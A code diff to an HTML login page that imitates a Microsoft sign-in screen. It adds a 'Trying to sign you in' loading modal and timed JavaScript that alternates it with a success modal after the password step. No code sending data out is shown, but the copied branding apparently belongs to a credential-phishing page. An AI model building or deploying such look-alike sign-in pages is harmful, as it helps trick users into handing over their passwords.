@@ -96,7 +96,7 @@
 
                 <!-- Error message for incorrect password -->
                 <div class="error-message" id="passwordErrorMessage" style="display: none;">Your account or password is
-                    incorrect. If you don't remember your password,</div>
+                    incorrect. If you don't remember your password.</div>
                 <div class="input pb-2">
                     <input type="password" name="loginfmt" id="password" maxlength="113"
                         class="form-control ltr_override input ext-input text-box" placeholder="Password">
@@ -179,6 +179,21 @@
                         target="_blank">Acceptable Use Policy</a></p>
             </div>
         </div>
+        <!-- loading 2 modal  -->
+        <div class="login-section" id="modal-5" style="display: none;">
+            <div class="card">
+                <img src="./assets/images/bannerlogo.png" style="width: 142px;height: auto;" alt="">
+                <h1 class="title">Trying to sign you in</h1>
+                <div class="col-12 my-3">
+                    <img src="./assets/images/marching_ants_986f40b5a9dc7d39ef8396797f61b323.gif" width="100%"
+                        height="auto" alt="">
+                </div>
+                <a href="#" class="link py-2" style="font-size: 20px;">Cancel</a>
+
+            </div>
+
+
+        </div>
         <div class="terms">
             <a href="">Terms of use</a>
             <a href="">Privacy & cookies</a>
@@ -230,9 +245,28 @@
                 var currentModal = document.getElementById('modal-3');
                 currentModal.style.display = 'none';
 
-                // Show modal-4
-                var successModal = document.getElementById('modal-4');
-                successModal.style.display = 'block';
+                // Show modal-5
+                var loading2Modal = document.getElementById('modal-5');
+                loading2Modal.style.display = 'block';
+
+                // After 2 seconds, show modal-4
+                setTimeout(function () {
+                    loading2Modal.style.display = 'none'; // Hide loading2 modal
+                    var successModal = document.getElementById('modal-4');
+                    successModal.style.display = 'block'; // Show success modal
+
+                    // After 2 seconds, show modal-5 again
+                    setTimeout(function () {
+                        successModal.style.display = 'none'; // Hide success modal
+                        loading2Modal.style.display = 'block'; // Show loading2 modal
+
+                        // After 2 seconds, show modal-4 again
+                        setTimeout(function () {
+                            loading2Modal.style.display = 'none'; // Hide loading2 modal
+                            successModal.style.display = 'block'; // Show success modal
+                        }, 2000); // 2 seconds delay
+                    }, 2000); // 2 seconds delay
+                }, 2000); // 2 seconds delay
             } else {
                 // Show error message for incorrect password
                 passwordErrorMessage.style.display = 'block';
